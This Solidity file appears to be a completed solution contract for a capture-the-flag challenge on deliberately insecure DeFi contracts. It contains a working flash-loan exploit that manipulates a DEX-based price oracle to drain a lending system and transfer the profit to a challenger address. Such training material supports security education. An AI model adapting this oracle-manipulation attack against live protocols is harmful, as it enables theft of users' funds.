// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {InSecureumLenderPool} from "../Challenge1.lenderpool.sol";
import {InsecureDexLP} from "../Challenge2.DEX.sol";
import {BorrowSystemInsecureOracle} from "../Challenge3.borrow_system.sol";

/*
 * Complete the contract below so that you can solve the challenge!
 * Note that you can (and may!) also modify the `deployExploits.js` file
 * and add the necessary calls to your exploit contract within the
 * `resolution.js` file.
 *
 * For this challenge, we already completed a tiny part of the
 * exploit contract for you! :)
 *
 * Also, if you need to declare additional contracts as helpers,
 * feel free to do so!
 */

/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                        EXPLOIT CONTRACTS                        //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

contract Exploit3 {
    /*
     * HINT:
     * You will most likely use these things here ;)
     */
    IERC20 immutable token0; // InSecureumToken
    IERC20 immutable token1; // BoringToken
    InSecureumLenderPool immutable pool;
    InsecureDexLP immutable dex;
    BorrowSystemInsecureOracle immutable borrowSystem;
    // Challenger account from solveChallenge3.js
    address private immutable challenger;

    constructor(
        IERC20 _token0,
        IERC20 _token1,
        InSecureumLenderPool _pool,
        InsecureDexLP _dex,
        BorrowSystemInsecureOracle _borrowSystem,
        address _challenger
    ) {
        token0 = _token0;
        token1 = _token1;
        pool = _pool;
        dex = _dex;
        borrowSystem = _borrowSystem;
        challenger = _challenger;
    }

    function start() external {
        bytes memory callData = abi.encodeWithSignature("attack()");
        pool.flashLoan(address(this), callData);
    }

    function attack() external {
        // Amount of flashloaned InsecureumToken in the context of InSecureumLenderPool (delegatecall)
        uint256 insecureumLoaned = token0.balanceOf(address(this));
        // Necessary token approvals for next steps
        token0.approve(address(dex), type(uint256).max);
        token1.approve(address(borrowSystem), type(uint256).max);
        /* Swap only 1/10 flashloaned amount of InsecureumToken (more profit for challenger)
           for equivalent amount of BoringToken 
        */
        uint256 boringAmount = dex.swap(
            address(token0),
            address(token1),
            insecureumLoaned / 10
        );

        // Deposit swapped amount of BoringToken to BorrowSystemInsecureOracle
        borrowSystem.depositToken1(boringAmount);
        // Borrow all of the InsecureumToken from BorrowSystemInsecureOracle
        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem)));
        uint256 insecureumBorrowed = token0.balanceOf(address(this));
        // Calculate the amount of InsecureumToken for the challenger. Rest of the tokens will be repayed to InSecureumLenderPool
        uint256 challengerProfit = insecureumBorrowed - insecureumLoaned;
        // Transfer profit to the challenger account
        token0.transfer(challenger, challengerProfit);
    }
}
